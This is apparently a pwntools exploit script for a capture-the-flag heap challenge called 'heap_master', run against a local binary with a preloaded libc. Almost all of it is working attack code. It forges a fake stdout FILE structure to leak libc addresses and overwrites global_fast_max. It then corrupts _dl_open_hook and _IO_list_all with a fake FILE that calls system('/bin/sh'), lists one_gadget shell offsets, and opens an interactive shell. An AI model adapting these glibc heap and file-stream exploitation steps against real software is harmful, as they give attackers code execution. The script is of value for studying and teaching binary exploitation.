from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("size: ",str(size))
def edit(off,c):
	cmd(2)
	p.sendlineafter("set: ",str(off))
	p.sendlineafter("size: ",str(len(c)))
	p.sendafter("content: ",c)
def free(off):
	cmd(3)
	p.sendlineafter("set: ",str(off))
context.log_level='debug'
#p=process('./heap_master',env={'LD_PRELOAD':"/glibc/x64/2.25/lib/libc-2.25.so"})
p=process("./heap_master",env={'LD_PRELOAD':"./libc.so.6"})
#libc=ELF("/glibc/x64/2.25/lib/libc-2.25.so")
libc=ELF("./libc.so.6")

##FAKE STDOUT 's off:0x620
for x in range(14):
	edit(0x610+x*0x10,p64(0)+p64(0x301))
edit(0x900,p64(0x21)*0x30)
for x in range(14):
	free(0x620+0x10*(13-x))
	add(0x2f8)
# so lets fill the fake chunk like... ooh , our fake_Stdout start's off:0x1000
'''
0x7ffff7dd5600 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd5683
0x7ffff7dd5610 <_IO_2_1_stdout_+16>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5620 <_IO_2_1_stdout_+32>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5630 <_IO_2_1_stdout_+48>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5640 <_IO_2_1_stdout_+64>:	0x00007ffff7dd5684	0x0000000000000000
0x7ffff7dd5650 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd5660 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd48c0
0x7ffff7dd5670 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd5680 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd6760
0x7ffff7dd5690 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd56a0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd4780	0x0000000000000000
0x7ffff7dd56b0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd56c0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd56d0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd1440

'''


'''

edit(0x670,p64(0)+p64(0x81))
edit(0x670+0x80,p64(0x21)*5)
edit(0x770,p64(0)+p64(0x81))
edit(0x770+0x80,p64(0x21)*5)
free(0x680)
free(0x780)
#'''

edit(0x620,p64(0xfbad1800)+"\x00".ljust(0x10,'\x00')+'\x00\x50')
#edit(0x640,'\x83\x56')
for x in range(4):
	edit(0x648+x*8,'\x83\x56')
edit(0x660,'\x84')
edit(0x668,'\x00'*0x20)
edit(0x688,'\xc0\x48')
edit(0x690,p64(1)+p64(0xffffffffffffffff)+p64(0x000000000a000000)+'\x60\x67')
edit(0x6b0,p64(0xffffffffffffffff)+p64(0)+'\x80\x47')
edit(0x6c8,p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+'\x40\x14')
#D0ne.... so let's get the control of global fast max
edit(0,p64(0)+p64(0x91)+'\x00'*0x88+p64(0x21)*5)
free(0x10)
edit(0x10,p64(0)+'\xc0\x67')
add(0x88)

# get it!
edit(0x620,p64(0xfbad1800)+p64(0x17e1))
edit(0x620+0x17d8,p64(0x21)*0x20)

free(0x630)
p.read(0x10)
magic=u64(p.read(8))
p.read(0x10)
base=u64(p.read(8))-(0x7ffff7dd4b68-0x7ffff7a37000)
log.warning(hex(magic))
log.warning(hex(base))

libc.address=base
# Modify the _dl_open_hook
n=0x18+2283-10+4
edit(0x1000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x1010)
one=0x3fe36+base
'''

'''
edit(0x1000,p64(0x000555555554FC0)+p64(0x7ffff7b15e89)+p64(0))
# _dl_open_hook get  

# _IO_list_all 0x7ffff7dd5500
n=0x18
edit(0x2000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x2010)


n=320+1
edit(0x2000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x2010)

system=libc.sym['system']
#
fio=magic+0x2000
fake = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(0)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
edit(0x2000,fake)

'''
0x3fe36	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3fe8a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6175	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
#gdb.attach(p,'b *0x7ffff7ab0a30')
gdb.attach(p,'b _IO_vtable_check')
cmd("A")

p.interactive()

'''
_dl_open_hook:0x7ffff7dd62e0
stdout:0x7ffff7dd2708
global_fast_max:0x7ffff7dd67d0
'''
